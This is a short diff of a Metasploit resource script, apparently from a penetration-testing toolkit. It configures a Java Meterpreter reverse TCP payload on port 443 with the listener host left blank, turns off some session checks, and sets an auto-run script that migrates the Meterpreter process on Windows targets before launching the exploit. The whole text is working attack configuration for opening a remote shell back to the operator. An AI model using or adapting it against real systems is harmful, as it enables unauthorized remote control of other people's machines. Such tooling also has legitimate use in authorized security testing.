@@ -4,6 +4,7 @@ set URIPATH /
 set PAYLOAD java/meterpreter/reverse_tcp
 set LHOST 
 set LPORT 443
-set InitialAutoRunScript migrate -f
+set AutoLoadStdapi false
+set AutoVerifySession false
+set AutoRunScript post/windows/manage/migrate
 exploit
-set AutoRunScript /opt/discover/resource/post.rc
